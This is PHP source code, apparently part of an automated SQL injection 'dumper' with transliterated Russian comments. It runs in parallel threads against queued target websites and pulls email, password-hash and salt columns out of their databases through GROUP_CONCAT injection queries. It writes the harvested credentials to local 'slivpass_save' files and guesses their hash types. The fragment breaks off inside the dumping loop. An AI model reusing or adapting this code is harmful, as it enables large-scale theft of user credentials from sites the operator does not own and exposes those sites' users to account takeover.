		mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/slivpass_save_solt', 511);
		set_time_limit(0);
		$this->r = rand(1, 100);
		$settings['potok_one'] = $this->potok_one;
		$settings['dump_one'] = $this->dump_one;
		$settings['check_url'] = $this->check_url;
		$settings['potok'] = $this->potok;
		$settings['pass'] = $this->pass;
		$this->timeStart = $this->start('getmailfullMulti', $settings['potok']);
		$this->logs('getmailfullMulti - START:' . $this->r . ' ', 'getmailfullMulti');
		$data = $this->Post->query('SELECT * FROM  `fileds` WHERE `password`!=\'\' AND  `password`!=\':\' AND `salt`!=\'\' AND  `salt`!=\':\' AND `get` = \'1\' AND `multi`=1 ORDER BY  `fileds`.`count` DESC limit 1');

		if (count($data) == 0) {
			$data = $this->Post->query('SELECT * FROM  `fileds` WHERE `password`!=\'\' AND  `password`!=\':\' AND `salt` !=\'\' AND `salt`!=\':\' AND `get` = \'\'  ORDER BY  `fileds`.`count` DESC limit 1');

			if (count($data) == 0) {
				if ($this->pass_salt_check_only == true) {
					$data = $this->Post->query('SELECT * FROM  `fileds` WHERE `password`!=\'\' AND  `password`!=\':\' AND `salt`!=\'\' AND  `salt`!=\':\' AND `get` = \'1\' AND `multi`=1 ORDER BY  `fileds`.`count` DESC limit 1');
				}
				 else {
					$data = $this->Post->query('SELECT * FROM  `fileds` WHERE `password`!=\'\' AND  `password`!=\':\' AND `get` = \'1\' AND `multi`=1 ORDER BY  `fileds`.`count` DESC limit 1');
				}

				if (count($data) == 0) {
					if ($this->pass_salt_check_only == true) {
						$data = $this->Post->query('SELECT * FROM  `fileds` WHERE `password`!=\'\' AND  `password`!=\':\' AND `salt` !=\'\' AND `salt`!=\':\' AND `get` = \'\'  ORDER BY  `fileds`.`count` DESC limit 1');
					}
					 else {
						$data = $this->Post->query('SELECT * FROM  `fileds` WHERE `password`!=\'\' AND  `password`!=\':\' AND `get` = \'\' ORDER BY  `fileds`.`count` DESC limit 1');
					}

					if (count($data) == 0) {
						if ($settings['dump_one'] == 1) {
							$data = $this->Post->query('SELECT * FROM  `fileds` WHERE (`password`=\'\' or `password`=\':\') AND `get` = \'1\' AND `multi`=1 ORDER BY  `fileds`.`count` DESC limit 1');

							if (count($data) == 0) {
								$data = $this->Post->query('SELECT * FROM  `fileds` WHERE `password`=\':\' AND `get` = \'\' ORDER BY  `fileds`.`count` DESC limit 1');

								if (count($data) == 0) {
									$this->stop();
									exit('stop NETU c ONE');
								}

							}

						}
						 else {
							$this->stop();
							exit('stop ONE zapresheno, netu s passom');
						}
					}

				}

			}

		}


		$this->d($data, 'nachalo getmailfullMulti');

		foreach ($data as $val ) {
			if ($val['fileds']['up'] == 1) {
				$this->up = true;
			}


			if (($val['fileds']['salt'] != '') && ($val['fileds']['salt'] != ':')) {
				$this->salt = true;
			}
			 else {
				$this->salt = false;
			}

			$data = $this->Post->query('UPDATE  `fileds` SET  `get` =  \'1\',`multi` = 1 WHERE  `fileds`.`id` =' . $val['fileds']['id']);
			$this->Post->query('UPDATE  `starts` SET  `squle_id` = ' . $val['fileds']['id'] . ' WHERE  `time_start` =' . $this->timeStart);

			if (($val['fileds']['password'] !== '') && ($val['fileds']['password'] !== ':')) {
				if (trim($val['fileds']['typedb']) == 'mssql') {
					$sliv = $this->slivWithPassMssql($val['fileds']['id']);
				}
				 else {
					$sliv = $this->slivWithPassConcastMulti($val['fileds']['id']);
				}
			}
			 else if (trim($val['fileds']['typedb']) == 'mssql') {
				$sliv = $this->slivWithPassMssql($val['fileds']['id']);
			}
			 else {
				$sliv = $this->slivMulti($val['fileds']['id']);
			}

			if ($sliv !== 'vpizdu') {
				$multi = $this->Post->query('SELECT count(*) FROM  `multis` WHERE `filed_id` = ' . $val['fileds']['id'] . ' AND `get` =2');
				$this->d('////////////////////// NE V PIZDU OK VSE getmailfullMulti// ////////////////////////////////');

				if ($multi[0][0]['count(*)'] == $settings['potok']) {
					$this->logs('YES multis zakonchilo, id ' . $val['fileds']['id'], 'getmailfullMulti');
					$this->d('multis zakonchilo id ' . $val['fileds']['id']);
					$data = $this->Post->query('UPDATE  `fileds` SET  `get` =  \'2\', `multi` = 2 WHERE  `fileds`.`id` = ' . $val['fileds']['id']);
				}

			}
			 else {
				$this->d('//////////////////////////////////////vpizdu getmailfullMulti////////////////////////////////////');
				$multi = $this->Post->query('SELECT count(*) FROM  `multis` WHERE `filed_id` = ' . $val['fileds']['id'] . ' AND `get` =2 AND `dok` = 1');
				$this->d($multi, 'MULTI ' . 'SELECT count(*) FROM  `multis` WHERE `filed_id` = ' . $val['fileds']['id'] . ' AND `get` =2 AND `dok` = 1');
				$multi2 = $this->Post->query('SELECT count(*) FROM  `multis` WHERE `filed_id` = ' . $val['fileds']['id'] . ' AND `get` !=0');
				$this->d($multi2, 'MULTI2 SELECT count(*) FROM  `multis` WHERE `filed_id` = ' . $val['fileds']['id'] . ' AND `get` !=0');
				$multi3 = $this->Post->query('SELECT count(*) FROM  `multis` WHERE `filed_id` = ' . $val['fileds']['id'] . ' AND `get` =2 AND `potok`=6');
				$this->d($multi3, ' MULTI3 SELECT count(*) FROM  `multis` WHERE `filed_id` = ' . $val['fileds']['id'] . ' AND `get` =2 AND `potok`=6');
				$err = 2;

				if ($err <= $multi[0][0]['count(*)']) {
					$this->d($val['fileds']['id'], '$multi[0][0][count(*)] >= $err');

					if ($this->Post->query('UPDATE  `fileds` SET  `get` =  \'3\', `multi` = 0 WHERE  `fileds`.`id` =' . $val['fileds']['id'])) {
						$this->d('UPDATE  `fileds` SET  `get` =  \'3\', `multi` = 0 WHERE  `fileds`.`id` =' . $val['fileds']['id'], 'OK USPESHO');
						$this->logs('UPDATE  `fileds` SET  `get` =  \'3\', `multi` = 0 WHERE  `fileds`.`id` =' . $val['fileds']['id'], 'OK USPESHO');
					}
					 else {
						$this->d('UPDATE  `fileds` SET  `get` =  \'3\', `multi` = 0 WHERE  `fileds`.`id` =' . $val['fileds']['id'], 'NO!!! NE USPESHO');
						$this->logs('UPDATE  `fileds` SET  `get` =  \'3\', `multi` = 0 WHERE  `fileds`.`id` =' . $val['fileds']['id'], 'NO!!! NE USPESHO');
					}
				}


				if ((6 <= $multi2[0][0]['count(*)']) && (1 <= $multi[0][0]['count(*)'])) {
					$this->d('kol-vo potokov - ' . $multi2[0][0]['count(*)'] . ' i odna oshibka to zakrivaem dumping');
					$this->logs('kol-vo potokov - ' . $multi[0][0]['count(*)'] . ' i odna oshibka to zakrivaem dumping');
					$data = $this->Post->query('UPDATE  `fileds` SET  `get` =  \'3\', `multi` = 0 WHERE  `fileds`.`id` =' . $val['fileds']['id']);
					$this->logs('getmailfullMulti - STOP:' . $this->r . ' ', 'getmailfullMulti');
					$this->stop();
					exit('okay');
				}


				if (($multi2[0][0]['count(*)'] == 6) && ($multi3[0][0]['count(*)'] == 1)) {
					$this->d('$multi2[0][0][count(*)] ==6 AND $multi3[0][0][count(*)]==1');
					$data = $this->Post->query('UPDATE  `fileds` SET  `get` =  \'2\', `multi` = 2 WHERE  `fileds`.`id` =' . $val['fileds']['id']);
					$this->logs('getmailfullMulti - STOP:' . $this->r . ' ', 'getmailfullMulti');
					$this->stop();
					exit('okay');
				}


				if (($multi2[0][0]['count(*)'] == 6) && ($multi3[0][0]['count(*)'] == 1)) {
					$this->d('$multi2[0][0][count(*)] ==6 AND $multi3[0][0][count(*)]==1');
					$data = $this->Post->query('UPDATE  `fileds` SET  `get` =  \'2\', `multi` = 2 WHERE  `fileds`.`id` =' . $val['fileds']['id']);
					$this->logs('getmailfullMulti - STOP:' . $this->r . ' ', 'getmailfullMulti');
					$this->stop();
					exit('okay');
				}


				if (($multi2[0][0]['count(*)'] == 5) && ($multi[0][0]['count(*)'] == $settings['potok'])) {
					$this->d('$multi2[0][0][count(*)] ==5 AND $multi[0][0][count(*)]==1');
					$data = $this->Post->query('UPDATE  `fileds` SET  `get` =  \'2\', `multi` = 2 WHERE  `fileds`.`id` =' . $val['fileds']['id']);
					$this->logs('getmailfullMulti - STOP:' . $this->r . ' ', 'getmailfullMulti');
					$this->stop();
					exit('okay');
				}

			}
		}

		$this->logs('getmailfullMulti - STOP:' . $this->r . ' ', 'getmailfullMulti');
		$this->stop();
		exit('okay');
	}

	public function slivWithPassConcastMulti($id = 2)
	{
		if (!(isset($this->raznica_dump)) || ($this->raznica_dump == '')) {
			$this->raznica_dump = 60;
		}


		$settings['potok_one'] = $this->potok_one;
		$settings['dump_one_good'] = $this->dump_one_good;
		$settings['dump_one'] = $this->dump_one;
		$settings['check_url'] = $this->check_url;
		$settings['potok'] = $this->potok;
		$settings['pass'] = $this->pass;
		$mail = $this->Filed->findbyid($id);
		$filed_id = $mail['Filed']['id'];
		$this->logs($filed_id . '-$filed_id:' . $this->r, 'slivWithPassConcastMulti');
		$this->d(' nachalo slivWithPassConcastMulti');
		$squle = $this->Post->query('SELECT * FROM  `posts` WHERE `id` = ' . $mail['Filed']['post_id'] . ' limit 0,1');

		if (!(isset($squle[0]['posts']['id']))) {
			$data = $this->Post->query('UPDATE  `fileds` SET  `get` =  \'3\', multi = 0 WHERE  `fileds`.`id` =' . $mail['Filed']['id']);
			return 'vpizdu';
		}


		$this->d($squle, '$squle POSTS');

		if (2 < strlen($squle[0]['posts']['sleep'])) {
			$set = $squle[0]['posts']['sleep'];
			$this->d($set, 'pass SET dump slivWithPassConcastMulti');
		}
		 else {
			$set = false;
		}

		$bd = explode(':', $mail['Filed']['ipbase']);
		$count = $mail['Filed']['count'];
		$ff = intval($mail['Filed']['lastlimit']);

		if ($ff == '') {
			$ff = 0;
		}


		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		$this->mysqlInj->inject($squle[0]['posts']['header'] . '::' . $squle[0]['posts']['gurl'], $squle[0], $set);
		$multi = $this->Post->query('SELECT count(*) FROM  `multis` WHERE `filed_id` = ' . $mail['Filed']['id'] . ' AND `get` !=0');
		$tmpCount = $count - $mail['Filed']['lastlimit'];
		$oneCount = $tmpCount / $settings['potok'];
		$oneCount = round($oneCount);
		$shag = $this->shag;

		if ($shag == '') {
			$shag = 5;
		}


		$zapr = round($oneCount / $shag);

		if ($zapr == 0) {
			$zapr = 1;
		}


		$this->d($count, '$count');
		$this->d($mail['Filed']['lastlimit'], '$mail["Filed"]["lastlimit"]');
		$this->d($multi, 'multi SELECT count(*) FROM  `multis` WHERE `filed_id` = ' . $mail['Filed']['id'] . ' AND `get` !=0');
		$this->d($zapr, 'zapr pervuy KOLICHESTVO ITERACYU');
		$this->d($oneCount . ' oneCount perviy S KAKOGO BUDEM NACHINAT $count-$mail["Filed"]["lastlimit"]/$settings["potok"]');
		flush();

		if ($multi[0][0]['count(*)'] == 0) {
			$this->d('//////////////////////////////////pervyi potok////////////////////////////////////////');

			if ($count < $this->potok_dump_one) {
				$oneCount = $count;
				$shag = $shag - 10;
				$zapr = round($oneCount / $shag);
				$this->d($zapr, '$zapr ' . $this->potok_dump_one);
				$this->logs($zapr . ' $zapr 5000:' . $this->r, 'slivWithPassConcastMulti');
				$this->Post->query('UPDATE  `fileds` SET  `get` =  \'2\', `multi` = 2 WHERE  `id` =' . $filed_id);
			}


			$potok = 1;

			if ($ff == 0) {
				$start = 0;
			}
			 else {
				$start = $ff;
			}

			$numPotok = $this->Post->query('SELECT count(*) FROM  `multis` WHERE `potok` = ' . $potok . ' AND `filed_id`=' . $filed_id);
			$this->d($numPotok, '$numPotok vsego potokov');

			if ($numPotok[0][0]['count(*)'] == 0) {
				$f = 'slivWithPassConcastMulti';
				$this->d('shag 1');
				$post_id = $squle[0]['posts']['id'];
				$squle[0]['posts']['url'] = str_replace('http://', '', $squle[0]['posts']['url']);
				$squle[0]['posts']['url'] = 'http://' . $squle[0]['posts']['url'];
				$h2 = parse_url($squle[0]['posts']['url']);
				$domen = $h2['host'];
				$date = time();
				$tmpCount1 = $oneCount + $start;
				$this->d($post_id, '$post_id');
				$this->d($domen, 'domen');
				$this->d($tmpCount1, '$tmpCount1');
				$this->d($date, '$date');
				$this->d($f, '$f');
				$this->d($potok, '$potok');
				$this->d($start, '$start');
				$this->d($filed_id, '$filed_id');
				$this->d('shag 2');
				$this->d('INSERT INTO `multis` (`filed_id`,`lastlimit`,`count`,`get`,`potok`,`isp`,`post_id`,`domen`,`date`,`pid`) VALUES(' . $filed_id . ',' . $start . ',' . $tmpCount1 . ',1,' . $potok . ',\'' . $f . '\',' . $post_id . ',\'' . $domen . '\',\'' . $date . '\',' . $this->pid . ')');

				if ($this->Post->query('INSERT INTO `multis` (`filed_id`,`lastlimit`,`count`,`get`,`potok`,`isp`,`post_id`,`domen`,`date`,`pid`) VALUES(' . $filed_id . ',' . $start . ',' . $tmpCount1 . ',1,' . $potok . ',\'' . $f . '\',' . $post_id . ',\'' . $domen . '\',\'' . $date . '\',\'' . $this->pid . '\')')) {
				}


				$this->Post->query('UPDATE  `starts` SET  `potok` = ' . $potok . ' WHERE  `time_start` =' . $this->timeStart);
				$this->d('shag 3');
			}

		}
		 else {
			$this->d('ETO UJE NE PERVUY POTOK');
			$zav0 = $this->Post->query('SELECT * FROM  `multis` WHERE `get` = 3 AND `dok` = 1 AND `filed_id` =' . $filed_id . ' limit 1');
			$this->d($zav0, '$zav0 multislivcontacat pass  `get` = 3 AND `dok` = 1');

			if ($zav0[0]['multis']['get'] == 3) {
				$this->d('////////////////////////////////////////POPPITKI ISCHERPANU get = 3 AND dok = 1 V PIZDU//////////////////////////////////////////');

				if ($this->Post->query('UPDATE  `multis` SET  `get` =  2 WHERE  `potok` = ' . $zav0[0]['multis']['potok'] . ' AND `filed_id`=' . $filed_id)) {
					$this->d('YES update `multis` SET  `get` =  2');
				}


				$this->d('UPDATE  `multis` SET  `get` =  2 WHERE  `potok` = ' . $zav0[0]['multis']['potok'] . ' AND `filed_id`=' . $filed_id);
				$this->d($zav0, 'zav0 ETO ESLI BILI UJE 3 POPITKI `GET` 3 AND `DOK`=1 ////// Stavim status 2');
				return 'vpizdu';
			}


			$zav = $this->Post->query('SELECT * FROM  `multis` WHERE `get`=3 AND `dok` < 1 AND `filed_id`=' . $filed_id . ' limit 1');

			if ($zav[0]['multis']['get'] == 3) {
				$this->d('////////////////////PEREZAPUSK//////////////////////////////////////////');
				$this->d($zav, 'zav get=3 AND dok < 1 ////// dlya perezapuska');
				$dok = $zav[0]['multis']['dok'] + 1;
				$this->Post->query('UPDATE  `multis` SET  `get` =  1,`dok` =' . $dok . ' WHERE  `potok` = ' . $zav[0]['multis']['potok'] . ' AND `filed_id`=' . $filed_id);
				$this->Post->query('UPDATE  `starts` SET  `potok` = ' . $zav[0]['multis']['potok'] . ' WHERE  `time_start` =' . $this->timeStart);
				$start = $zav[0]['multis']['lastlimit'];
				$oneCount = $zav[0]['multis']['count'];
				$potok = $zav[0]['multis']['potok'];
				$shag = $shag - 10;
				$oneCount = $oneCount - $start;
				$zapr = round($oneCount / $shag);
				$this->d($zapr, '$zapr get 3 KOLICHESTO ITERACYU POSLE PERESAPUSKA');
			}
			 else {
				$this->d('////////////////////DOBAVLYAEM NOVYU POTOK//////////////////////////////////////////');
				$allPotok = $multi[0][0]['count(*)'];
				$next = $this->Post->query('SELECT * FROM  `multis` WHERE `potok` = ' . $allPotok . ' AND `filed_id`=' . $filed_id);
				$this->d($allPotok, '$allPotok slivWithPassConcastMulti');
				$this->d($next, '$next - infa o poslednem potoke slivWithPassConcastMulti');
				$start = $next[0]['multis']['count'];
				$oneCount = $next[0]['multis']['count'] + $oneCount;
				$oneCount = $oneCount - 20;
				$this->d($start, '$start');
				$this->d($count, '$count');
				$this->d($oneCount, '$oneCount');
				$potok = $next[0]['multis']['potok'] + 1;

				if ($count < $oneCount) {
					$this->d($oneCount . ' > ' . $count . ' oneCount > count  1');
					$oneCount = $count - 100;
					$start = $start - 100;

					if (6 <= $potok) {
						$potok = 6;
						$this->d('potok > 6 oneCount > count');

						if ($this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $allPotok . ' AND `filed_id`=' . $filed_id)) {
							$this->d('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $allPotok . ' AND `filed_id`=' . $filed_id);
							$this->d('YES update potok > 6 oneCount > count slivpass contact prosto');
						}


						return 'vpizdu';
					}

				}


				if ($oneCount < $count) {
					if ($multi[0][0]['count(*)'] < $settings['potok']) {
						$numPotok = $this->Post->query('SELECT count(*) FROM  `multis` WHERE `potok` = ' . $potok . ' AND `filed_id` =' . $filed_id);
						$this->d('SELECT count(*) FROM  `multis` WHERE `potok` = ' . $potok . ' AND `filed_id` =' . $filed_id, 'EST UJE POTOK TAKOY!!!');

						if ($numPotok[0][0]['count(*)'] == 0) {
							$f = 'slivWithPassConcastMulti';
							$post_id = $squle[0]['posts']['id'];
							$squle[0]['posts']['url'] = str_replace('http://', '', $squle[0]['posts']['url']);
							$squle[0]['posts']['url'] = 'http://' . $squle[0]['posts']['url'];
							$h2 = parse_url($squle[0]['posts']['url']);
							$domen = $h2['host'];
							$date = time();

							if ($this->Post->query('INSERT INTO multis (`filed_id`,`lastlimit`,`count`,`get`,`potok`,`isp`,`post_id`,`domen`,`date`,`pid`) VALUES(' . $filed_id . ',' . $start . ',' . $oneCount . ',1,' . $potok . ',\'' . $f . '\',' . $post_id . ',\'' . $domen . '\',\'' . $date . '\',' . $this->pid . ')')) {
								$this->d($potok . ' $potok YES insert zapis');
								$this->logs($potok . ' - potok; YES insert zapis:' . $this->r, 'slivWithPassConcastMulti');
							}
							 else {
								$this->d($potok . ' $potok NO!!!! insert zapis');
								$this->logs($potok . ' - potok;NO!!! insert zapis:' . $this->r, 'slivWithPassConcastMulti');
							}

							$this->Post->query('UPDATE  `starts` SET  `potok` = ' . $potok . ' WHERE  `time_start` =' . $this->timeStart);
						}
						 else {
							$this->d('POTOK UJE EST v multis status get=3 stavim slivWithPassConcastMulti');
							$this->logs('POTOK UJE EST v multis status get=3 stavim slivWithPassConcastMulti' . $this->r, 'slivWithPassConcastMulti');
							$this->d('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
							$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
							return 'vpizdu';
						}
					}
					 else {
						$this->d('$multis[0][0][count(*)] <= $settings[potok]');
						$this->logs('$multis[0][0][count(*)] <= $settings[potok]:' . $this->r, 'slivWithPassConcastMulti');

						if (6 < $potok) {
							$potok = 6;
							$this->d('potok > 6');
						}


						$this->d('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
						$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
						return 'vpizdu';
					}
				}

			}
		}

		$squle[0]['posts']['url'] = str_replace('http://', '', $squle[0]['posts']['url']);
		$squle[0]['posts']['url'] = 'http://' . $squle[0]['posts']['url'];
		$url = parse_url($squle[0]['posts']['url']);
//$this->d($url, '$url::14898');
		$zone = explode('.', $url['host']);
		$zone = $zone[count($zone) - 1];

		if ($this->sliv_pass_save == true) {
			if ($this->salt == true) {
				$filename = './slivpass_save_solt/' . $url['host'] . $mail['Filed']['table'] . '.txt';
				$fh = fopen($filename, 'a+');
			}
			 else {
				$filename = './slivpass_save/' . $url['host'] . $mail['Filed']['table'] . '.txt';
				$fh = fopen($filename, 'a+');
			}

			fwrite($fh, $squle[0]['posts']['url'] . "\n");
		}


		$time = time();
		$this->l2 = 0;
		$this->tmp2 = array();
		$this->k = 0;
		$this->l5 = 0;
		$this->tmp5 = array();
		$this->emp = 0;
		$this->email_gavno = 0;
		$this->emp_pass = 0;
		$this->logs($zapr . '-zapr poslednyu:' . $this->r, 'slivWithPassConcastMulti');
		$this->logs($oneCount . '-oneCount:' . $this->r, 'slivWithPassConcastMulti');
		$this->logs($count . '-count:' . $this->r, 'slivWithPassConcastMulti');
		$this->logs($start . '-start:' . $this->r, 'slivWithPassConcastMulti');
		$this->logs($potok . '-potok:' . $this->r, 'slivWithPassConcastMulti');
		$this->d($zapr . '-zapr poslednyu:' . $this->r);
		$this->d($oneCount . '-oneCount:' . $this->r);
		$this->d($count . '-count:' . $this->r);
		$this->d($start . '-start:' . $this->r);
		$this->d($potok . '-potok:' . $this->r);
		$this->d($this->pid . '-pid:' . $this->r);
		flush();
		$i = 0;

		while ($i < $zapr) {
			echo $i . '-i<br>';
			$this->workup();
			$new = time();
			$razn = $new - $time;
			$this->d($razn, 'razn');

			if ($this->raznica_dump < $razn) {
				$this->d($razn . '-razn slivWithPassConcastMulti po vremeni > 25:' . $this->r);
				$this->logs($razn . '-razn po vremeni:' . $this->r, 'slivWithPassConcastMulti');
				$this->Post->query('UPDATE  `multis` SET  `get` = 3  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
				$this->Post->query('UPDATE  `multis` SET  `prich` = \'razn slivWithPassConcastMulti po vremeni\'  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
				return 'vpizdu';
			}


			$time = time();
			$this->workup();
			$pass = explode(':', $mail['Filed']['password']);
			$pass = $pass[1];

			if ($mail['Filed']['name'] != '') {
				$name = $mail['Filed']['name'];
			}


			$this->Post->query('UPDATE  `multis` SET  `lastlimit` = ' . $start . ',`date`= ' . $time . ',`pid`=' . $this->pid . ' WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
			$salt = explode(':', $mail['Filed']['salt']);
			$salt = $salt[1];

			if ($this->salt == true) {
				$mysql = $this->mysqlInj->mysqlGetValue('', '(SELECT+' . $mail['Filed']['label'] . ',' . $pass . ',' . $salt . ' FROM ' . $bd[1] . '.`' . $mail['Filed']['table'] . '` WHERE `' . $mail['Filed']['label'] . '` LIKE char(' . $this->charcher('%@%') . ') LIMIT ' . $start . ',' . $shag . ')t ', 'GROUP_CONCAT(t.' . $mail['Filed']['label'] . ',char(' . $this->charcher(':') . '),t.' . $pass . ',char(' . $this->charcher(':') . '),t.' . $salt . ')', 0, array());
			}
			 else {
				$mysql = $this->mysqlInj->mysqlGetValue('', '(SELECT+' . $mail['Filed']['label'] . ',' . $pass . ' FROM ' . $bd[1] . '.`' . $mail['Filed']['table'] . '` WHERE `' . $mail['Filed']['label'] . '` LIKE char(' . $this->charcher('%@%') . ') LIMIT ' . $start . ',' . $shag . ')t ', 'GROUP_CONCAT(t.' . $mail['Filed']['label'] . ',char(' . $this->charcher(':') . '),t.' . $pass . ')', 0, array());
			}

			$start2 = $start;
			$start = $start + $shag;
			$this->d($mysql, '$mysql');

			if ($this->salt == true) {
				if (($i == 0) && !(isset($mysql['GROUP_CONCAT(t.' . $mail['Filed']['label'] . ',char(' . $this->charcher(':') . '),t.' . $pass . ',char(' . $this->charcher(':') . '),t.' . $salt . ')']))) {
					$shag_new = $shag - 10;
					$mysql = $this->mysqlInj->mysqlGetValue('', '(SELECT+' . $mail['Filed']['label'] . ',' . $pass . ',' . $salt . ' FROM ' . $bd[1] . '.`' . $mail['Filed']['table'] . '` WHERE `' . $mail['Filed']['label'] . '` LIKE char(' . $this->charcher('%@%') . ') LIMIT ' . $start . ',' . $shag_new . ')t ', 'GROUP_CONCAT(t.' . $mail['Filed']['label'] . ',char(' . $this->charcher(':') . '),t.' . $pass . ',char(' . $this->charcher(':') . '),t.' . $salt . ')', 0, array());
					$this->d($mysql_new, '$mysql_new');

					if (isset($mysql_new['GROUP_CONCAT(t.' . $mail['Filed']['label'] . ',char(' . $this->charcher(':') . '),t.' . $pass . ',char(' . $this->charcher(':') . '),t.' . $salt . ')'])) {
						$this->d('shag nado menshe');
						$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
						$this->Post->query('UPDATE  `multis` SET  `prich` = \'UMENSHEN SHAG - minus 10\'  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
						return 'vpizdu';
					}

				}

			}
			 else if (($i == 0) && !(isset($mysql['GROUP_CONCAT(t.' . $mail['Filed']['label'] . ',char(' . $this->charcher(':') . '),t.' . $pass . ')']))) {
				$shag_new = $shag - 10;
				$mysql_new = $this->mysqlInj->mysqlGetValue('', '(SELECT+' . $mail['Filed']['label'] . ',' . $pass . ' FROM ' . $bd[1] . '.`' . $mail['Filed']['table'] . '` WHERE `' . $mail['Filed']['label'] . '` LIKE char(' . $this->charcher('%@%') . ') LIMIT ' . $start . ',' . $shag_new . ')t ', 'GROUP_CONCAT(t.' . $mail['Filed']['label'] . ',char(' . $this->charcher(':') . '),t.' . $pass . ')', 0, array());
				$this->d($mysql_new, '$mysql_new');

				if (isset($mysql_new['GROUP_CONCAT(t.' . $mail['Filed']['label'] . ',char(' . $this->charcher(':') . '),t.' . $pass . ')'])) {
					$this->d('shag nado menshe');
					$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
					$this->Post->query('UPDATE  `multis` SET  `prich` = \'UMENSHEN SHAG - minus 10\'  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
					return 'vpizdu';
				}

			}


			if ($this->salt == true) {
				if (($i == 0) && !(isset($mysql['GROUP_CONCAT(t.' . $mail['Filed']['label'] . ',char(' . $this->charcher(':') . '),t.' . $pass . ',char(' . $this->charcher(':') . '),t.' . $salt . ')']))) {
					if ($this->sliv_pass_save == true) {
						fclose($fh);
					}


					$this->Post->query('UPDATE  `multis` SET  `function` = 1 WHERE  `potok` =' . $potok . ' AND `filed_id` =' . $filed_id);
					$this->logs('function = 1:' . $this->r, 'slivWithPassConcastMulti');

					if ($this->slivWithPassMulti($id, $potok, $start2, $oneCount) == 'vpizdu') {
						$this->Post->query('UPDATE  `multis` SET  `prich` = \'function = Multi SOLT vpizdu \'  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
						return 'vpizdu';
					}


					return;
				}

			}
			 else if (($i == 0) && !(isset($mysql['GROUP_CONCAT(t.' . $mail['Filed']['label'] . ',char(' . $this->charcher(':') . '),t.' . $pass . ')']))) {
				if ($this->sliv_pass_save == true) {
					fclose($fh);
				}


				$this->Post->query('UPDATE  `multis` SET  `function` = 1 WHERE  `potok` =' . $potok . ' AND `filed_id` =' . $filed_id);
				$this->logs('function = 1:' . $this->r, 'slivWithPassConcastMulti');

				if ($this->slivWithPassMulti($id, $potok, $start2, $oneCount) == 'vpizdu') {
					$this->Post->query('UPDATE  `multis` SET  `prich` = \'function = Multi vizdu\'  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
					return 'vpizdu';
				}


				return;
			}


			if ((trim($mysql['GROUP_CONCAT(t.' . $mail['Filed']['label'] . ',char(' . $this->charcher(':') . '),t.' . $pass . ')']) !== '') || trim($mysql['GROUP_CONCAT(t.' . $mail['Filed']['label'] . ',char(' . $this->charcher(':') . '),t.' . $pass . ',char(' . $this->charcher(':') . '),t.' . $salt . ')'] !== '')) {
				if ($this->salt == true) {
					$mails = explode(',', $mysql['GROUP_CONCAT(t.' . $mail['Filed']['label'] . ',char(' . $this->charcher(':') . '),t.' . $pass . ',char(' . $this->charcher(':') . '),t.' . $salt . ')']);
				}
				 else {
					$mails = explode(',', $mysql['GROUP_CONCAT(t.' . $mail['Filed']['label'] . ',char(' . $this->charcher(':') . '),t.' . $pass . ')']);
				}

				$null = 0;
				$l = 0;
				$tmp = array();
				$tmp3 = array();

				foreach ($mails as $value ) {
					echo '||' . $value . '||<br/>';

					if ($this->sliv_pass_save == true) {
						fwrite($fh, trim($value) . "\n");
					}


					$p = explode(':', $value);

					if (!(isset($p[1]))) {
						$pass = '';
					}
					 else {
						$pass = trim($p[1]);
					}

					if (!(isset($p[2]))) {
						$salt_new = '';
					}
					 else {
						$salt_new = trim($p[2]);
					}

					if (strpos($p[1], 'mysql_fetch_array()')) {
						$this->Post->query('UPDATE  `multis` SET  `prich` = \'mysql_fetch_array\'  WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
						$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
						$this->d('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
						$this->d('mysql_fetch_array() UHODIM');

						return 'vpizdu';
					}


					if ($pass == '') {
						$this->emp_pass++;
					}


					if (($this->pass_empty < $this->emp_pass) && ($this->up == false)) {
						$this->logs('$this->emp_pass > N:' . $this->r, 'slivWithPassConcastMulti');
						$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
						$this->Post->query('UPDATE  `multis` SET  `prich` = \'emp_pass > ' . $this->pass_empty . '  pass pustie\'  WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);

						return 'vpizdu';
					}


					@$key0 = array_search($pass, $this->stopword);

					if (($key0 === false) && (2 < strlen($pass)) && ($p[0] != 'null')) {
						$ht = $this->hashtype($pass);

						if ($ht != 1) {
							$this->hashtype = $ht;
						}
						 else {
							$this->hashtype = '0';
						}

						preg_match('/\A(?:^([a-z0-9][a-z0-9_\-\.\+]*)@([a-z0-9][a-z0-9\.\-]{0,63}\.([a-z]{2,4}))$)\z/i', $p[0], $z);

						if ($z[0] != '') {
							$m = explode('@', $z[0]);
							@$key = array_search($pass, $tmp);
							@$key2 = array_search(strlen($pass), array_slice($this->tmp2, count($this->tmp2) - 1));
							@$key5 = array_search(strlen($z[0]), array_slice($this->tmp5, count($this->tmp5) - 1));
							@$key3 = array_search($p[0], $tmp3);
							$tmp[] = $pass;
							$tmp3[] = $p[0];
